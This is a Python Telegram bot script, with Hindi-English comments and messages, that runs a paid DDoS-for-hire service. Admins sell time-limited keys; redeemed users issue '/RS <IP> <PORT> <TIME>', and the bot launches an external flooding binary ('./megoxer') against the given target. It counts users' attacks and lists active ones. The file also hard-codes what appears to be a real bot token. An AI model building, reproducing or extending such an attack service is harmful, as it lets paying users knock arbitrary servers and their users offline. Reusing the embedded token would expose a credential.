#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
import random
import string
import pytz  # ✅ Timezone के लिए Import
from telebot import types

# TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7973805250:AAFCWBD-moWYmZe0jFlv6o3OlA3tAFBlyy4')

# GROUP AND CHANNEL DETAILS
GROUP_ID = "-1002252633433"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
ADMINS = [7129010361]  # Admin IDs

# GLOBAL VARIABLES
pending_feedback = {}
warn_count = {}
attack_logs = []
user_attack_count = {}
keys = {}
redeemed_users = {}
active_attacks = []

# ✅ IST Timezone सेट करो (New Delhi)
IST = pytz.timezone('Asia/Kolkata')

# FUNCTION TO CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# ✅ FUNCTION TO GENERATE CUSTOM KEYS BASED ON TIME
def generate_custom_key(days=0, hours=0):
    time_label = ""
    
    if days > 0:
        time_label = f"{days}D"
    elif hours > 0:
        time_label = f"{hours}H"
    else:
        time_label = "UNL"

    random_text = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
    return f"{time_label}RSDANGER{random_text}"

# ✅ FIXED: /GENKEY COMMAND (ADMIN ONLY)
@bot.message_handler(commands=['genkey'])
def generate_access_key(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split()
    if len(command) < 2 or len(command) > 3:
        bot.reply_to(message, "⚠️ USAGE: /genkey <DAYS> [HOURS]")
        return

    try:
        days = int(command[1])
        hours = int(command[2]) if len(command) == 3 else 0
    except ValueError:
        bot.reply_to(message, "❌ DAYS AND HOURS MUST BE NUMBERS!")
        return

    # ✅ Expiry Time को IST टाइमज़ोन में सेट करो
    expiry_date = datetime.datetime.now(pytz.utc) + datetime.timedelta(days=days, hours=hours)
    expiry_date = expiry_date.astimezone(IST)

    new_key = generate_custom_key(days, hours)  # ✅ नई Key जनरेट करो
    keys[new_key] = expiry_date  # ✅ Key Store करो

    bot.reply_to(message, f"✅ NEW KEY GENERATED:\n🔑 `{new_key}`\n📅 Expiry: {expiry_date.strftime('%Y-%m-%d %H:%M IST')}", parse_mode="Markdown")

# ✅ FIXED: SCREENSHOT SYSTEM (Now Always Forwards)
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = message.from_user.id

    caption_text = f"📸 **USER SCREENSHOT RECEIVED!**\n👤 **User ID:** `{user_id}`\n✅ **Forwarded to Admins!**"
    file_id = message.photo[-1].file_id
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=caption_text, parse_mode="Markdown")
    
    bot.reply_to(message, "✅ SCREENSHOT FORWARDED SUCCESSFULLY!")

# ✅ Existing /REDEEM System (No Change)
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ USAGE: /redeem <KEY>")
        return

    user_id = message.from_user.id
    key = command[1]

    # ✅ अगर key पहले से redeem हो चुकी है, तो user details दिखाओ
    for uid, data in redeemed_users.items():
        if data["key"] == key:
            bot.reply_to(message, f"❌ **YE KEY ALREADY REDEEMED HO CHUKI HAI!**\n👤 **Redeemed By:** `{uid}`\n📅 **Expiry:** {data['expiry'].strftime('%Y-%m-%d %H:%M IST')}", parse_mode="Markdown")
            return

    # ✅ अगर key invalid है
    if key not in keys:
        bot.reply_to(message, "❌ **INVALID KEY!**")
        return

    # ✅ Expired key check
    if datetime.datetime.now(IST) > keys[key]:
        bot.reply_to(message, "⏳ **YE KEY EXPIRED HO CHUKI HAI!**")
        del keys[key]
        return

    expiry = keys[key]
    redeemed_users[user_id] = {"key": key, "expiry": expiry}
    del keys[key]

    bot.reply_to(message, f"🎉 **SUCCESSFULLY REDEEMED!**\n📅 **Expiry:** {expiry.strftime('%Y-%m-%d %H:%M IST')}", parse_mode="Markdown")

# /MYINFO COMMAND
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = message.from_user.id
    info_msg = f"👤 **USER INFO**\n\n🆔 **Telegram ID:** `{user_id}`\n"

    if user_id in redeemed_users:
        expiry = redeemed_users[user_id]["expiry"].strftime('%Y-%m-%d %H:%M IST')  # ✅ Fix
        info_msg += f"✅ **Access Granted:** Yes\n📅 **Expires on:** {expiry}\n"
    else:
        info_msg += "❌ **Access Granted:** No\n"

    attack_count = user_attack_count.get(user_id, 0)
    info_msg += f"🚀 **Total Attacks:** {attack_count}\n"

    bot.reply_to(message, info_msg, parse_mode="Markdown")

# ✅ Existing /RS Attack System (No Change)
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    user_id = message.from_user.id
    command = message.text.split()

    if user_id not in redeemed_users:
        bot.reply_to(message, "❌ PEHLE /redeem KARKAY ACCESS LO!")
        return

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 YE BOT SIRF GROUP ME CHALEGA! ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ PEHLE CHANNEL JOIN KAR! {CHANNEL_USERNAME}")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ USAGE: /RS <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ PORT AUR TIME NUMBER HONE CHAHIYE!")
        return

    if time_duration > 240:
        bot.reply_to(message, "🚫 240S SE ZYADA ALLOWED NAHI HAI!")
        return

    confirm_msg = f"🔥 ATTACK DETAILS:\n🎯 TARGET: `{target}`\n🔢 PORT: `{port}`\n⏳ DURATION: `{time_duration}S`\nSTATUS: `CHAL RAHA HAI...`! 📸SCREENSHOT OPTIONAL HAI, LEKIN AGAR BHEJOGE TO CHANNEL PE FORWARD HOGA!"
    bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")

    attack_info = {"user_id": user_id, "target": target, "port": port, "time": time_duration}
    active_attacks.append(attack_info)

    user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1

    def attack_execution():
        try:
            subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
        except subprocess.TimeoutExpired:
            bot.reply_to(message, "❌ ATTACK TIMEOUT HO GAYA! 🚨")
        except subprocess.CalledProcessError:
            bot.reply_to(message, "❌ ATTACK FAIL HO GAYA!")
        finally:
            bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 📸 SCREENSHOT BHEJOGE TO CHANNEL PE CHALA JAYEGA!🎯")

    threading.Thread(target=attack_execution).start()

# ✅ Existing /CHECK Command (No Change)
@bot.message_handler(commands=['check'])
def check_attacks(message):
    if not active_attacks:
        bot.reply_to(message, "❌ KOI BHI ATTACK ACTIVE NAHI HAI!")
        return

    check_msg = "📊 **ACTIVE ATTACKS:**\n\n"
    for attack in active_attacks:
        check_msg += f"👤 `{attack['user_id']}` ➝ 🎯 `{attack['target']}:{attack['port']}` ({attack['time']}s)\n"

    bot.send_message(message.chat.id, check_msg, parse_mode="Markdown")

# START BOT
bot.polling(none_stop=True)